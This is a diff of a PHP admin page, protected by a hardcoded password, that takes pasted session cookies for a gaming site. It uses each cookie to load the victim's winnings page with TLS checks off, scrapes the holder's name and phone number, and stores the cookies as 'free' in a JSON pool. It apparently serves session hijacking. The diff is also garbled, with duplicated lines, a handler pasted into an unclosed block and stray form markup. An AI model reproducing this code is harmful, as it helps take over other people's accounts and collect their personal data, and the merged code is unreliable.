@@ -2,8 +2,13 @@
 session_start();
 
 $password = 'flashkidd';
+
 $message = '';
 $success = '';
+
+$message  = '';
+$success  = '';
+
 
 function fetchInfo($cookie, $url) {
     $ch = curl_init();
@@ -27,10 +32,17 @@ function fetchInfo($cookie, $url) {
         'User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
     ];
     curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+
 
     $html = curl_exec($ch);
     curl_close($ch);
@@ -47,6 +59,7 @@ function fetchInfo($cookie, $url) {
 
     return ['phone' => $phone, 'name' => $name];
 }
+
 
 if (isset($_POST['password']) && $_POST['password'] === $password) {
     $_SESSION['auth'] = true;
@@ -76,6 +89,32 @@ if (isset($_SESSION['auth']) && isset($_POST['cookie'], $_POST['type'])) {
             $success = sprintf('%s (%s) has been added.', htmlspecialchars($info['name']), htmlspecialchars($info['phone']));
         } else {
             $message = 'Invalid cookie';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $entered = $_POST['password'] ?? '';
+    $cookie  = trim($_POST['cookie'] ?? '');
+    if ($entered === $password) {
+        $file = 'cookies.json';
+        $url  = 'https://gameplay.mzansigames.club/my-winnings?display=tab3';
+
+        $list = json_decode(file_get_contents($file), true);
+        foreach ($list as $entry) {
+            if ($entry['value'] === $cookie) {
+                $message = 'Cookie already exists';
+                break;
+            }
+        }
+
+        if ($message === '') {
+            $info = fetchInfo($cookie, $url);
+            if ($info['name'] && $info['phone']) {
+                $list[] = ['value' => $cookie, 'isFree' => true];
+                file_put_contents($file, json_encode($list, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES));
+                $success = sprintf('%s (%s) has been added.', htmlspecialchars($info['name']), htmlspecialchars($info['phone']));
+            } else {
+                $message = 'Invalid cookie';
+            }
+
         }
     }
 }
@@ -87,7 +126,12 @@ if (isset($_SESSION['auth']) && isset($_POST['cookie'], $_POST['type'])) {
 <title>Add Cookie</title>
 <style>
 body {
+
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+        "Helvetica Neue", Arial, sans-serif;
+
     background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
     margin: 0;
     padding: 0;
@@ -112,7 +156,11 @@ label {
     display: block;
     margin-top: 10px;
 }
+
 input[type="password"], textarea, select {
+
+input[type="password"], textarea {
+
     width: 100%;
     padding: 10px;
     box-sizing: border-box;
@@ -148,6 +196,7 @@ button {
 </head>
 <body>
 <div class="container">
+
 <?php if (!isset($_SESSION['auth'])): ?>
     <h2>Enter Password</h2>
     <?php if ($message): ?><p class="message"><?php echo $message; ?></p><?php endif; ?>
@@ -157,10 +206,13 @@ button {
         <button type="submit">Login</button>
     </form>
 <?php else: ?>
+
+
     <h2>Add Cookie</h2>
     <?php if ($message): ?><p class="message"><?php echo $message; ?></p><?php endif; ?>
     <?php if ($success): ?><p class="success"><?php echo $success; ?></p><?php endif; ?>
     <form method="post">
+
         <label>Cookie:</label>
         <textarea name="cookie" placeholder="Paste cookie here" required></textarea>
         <label>Type:</label>
@@ -171,6 +223,14 @@ button {
         <button type="submit">Add</button>
     </form>
 <?php endif; ?>
+
+        <label>Password:</label>
+        <input type="password" name="password" placeholder="Password" required>
+        <label>Cookie:</label>
+        <textarea name="cookie" placeholder="Paste cookie here" required></textarea>
+        <button type="submit">Add</button>
+    </form>
+
 </div>
 </body>
 </html>
